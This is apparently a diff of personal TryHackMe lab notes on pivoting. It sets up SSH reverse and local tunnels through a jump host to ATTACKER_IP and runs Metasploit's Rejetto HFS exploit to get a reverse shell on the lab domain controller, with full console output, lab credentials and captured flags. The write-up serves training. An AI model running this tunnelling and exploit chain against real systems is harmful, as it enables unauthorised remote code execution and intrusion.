@@ -1412,7 +1412,7 @@ Then attacker connects:
 xfreerdp /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020
 ```
 
-#Then on desktop should see flag.exe file with the following content.
+### Then on desktop should see flag.exe file with the following content.
 Flag: THM{SIGHT_BEYOND_SIGHT}
 
 ### Tunnelling the Rejetto HFS Exploit
@@ -1451,30 +1451,76 @@ The HFS exploit requires three connections:
 THMDC:80  <--R--  THMJMP2  <--L--  Attacker
    |             |             |
    |             |             |
-   |----> 8888 --|             |
-                 |-- 6666 -->  |
+   |----> 8001 --|             |
+                 |-- 6001 -->  |
                  |-- 7878 -->  |
 ```
+Basically SSH tunnel is configured on the THMJMP2 server between target THMDC and attacker-ip. 
+Attacker listening port 7878 connects to THMJMP2 on port 6001.
+THMJMP connects to target listening on port 8001 to port 80 on target THMDC.
+Once configured the MSFCONSOLE sends the rejetto exploit to thmdc to gain remote connection.
+
 SSH command on THMJMP2:
 ```
 ssh tunneluser@ATTACKER_IP \
-  -R 8888:thmdc.za.tryhackme.com:80 \
-  -L *:6666:127.0.0.1:6666 \
+  -R 8001:thmdc.za.tryhackme.com:80 \
+  -L *:6001:127.0.0.1:6001 \
   -L *:7878:127.0.0.1:7878 \
   -N
 ```
+
+
 Metasploit settings:
 ```
-set lhost thmjmp2.za.tryhackme.com
-set ReverseListenerBindAddress 127.0.0.1
-set lport 7878
-set srvhost 127.0.0.1
-set srvport 6666
-set rhosts 127.0.0.1
-set rport 8888
-exploit
-```
+$ msfconsole
+...
+msf > use rejetto_hfs_exec
+Matching Modules
+================
+...
+0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
+...
+msf exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.za.tryhackme.com
+msf exploit(windows/http/rejetto_hfs_exec) > set ReverseListenerBindAddress 127.0.0.1
+msf exploit(windows/http/rejetto_hfs_exec) > set lport 7878
+msf exploit(windows/http/rejetto_hfs_exec) > set srvhost 127.0.0.1
+msf exploit(windows/http/rejetto_hfs_exec) > set srvport 6001
+msf exploit(windows/http/rejetto_hfs_exec) > set rhost 127.0.0.1
+msf exploit(windows/http/rejetto_hfs_exec) > set rport 8001
 
+msf exploit(windows/http/rejetto_hfs_exec) > exploit
+[*] Started reverse TCP handler on 127.0.0.1:7878 
+[*] Using URL: http://thmjmp2.za.tryhackme.com:6001/wbuUYpXEQymI
+[*] Server started.
+[*] Sending a malicious request to /
+[*] Payload request received: /wbuUYpXEQymI
+[*] Sending stage (240 bytes) to 127.0.0.1
+[!] Tried to delete %TEMP%\RMANei.vbs, unknown result
+[*] Command shell session 1 opened (127.0.0.1:7878 -> 127.0.0.1:57286) at 2026-07-11 14:18:41 +1000
+[*] Server stopped.
+
+Shell Banner:
+Microsoft Windows [Version 10.0.17763.1098]
+-----        
+
+C:\hfs>type flag.txt
+type flag.txt
+THM{FORWARDING_IT_ALL}
+```
+# This is unnecessary, check to see what was in %TEMP% after earlier efforts.
+#Check content of %TEMP% had trouble earlier with file that was not deleted.
+```
+C:\hfs> dir %TEMP%
+...
+07/11/2026  05:18 AM    <DIR>          .
+07/11/2026  05:18 AM    <DIR>          ..
+07/11/2026  05:18 AM    <DIR>          rad1F529.tmp
+               0 File(s)              0 bytes
+               3 Dir(s)  50,156,097,536 bytes free
+
+C:\hfs>
+
+```
 Flag: THM{FORWARDING_IT_ALL}
 
 
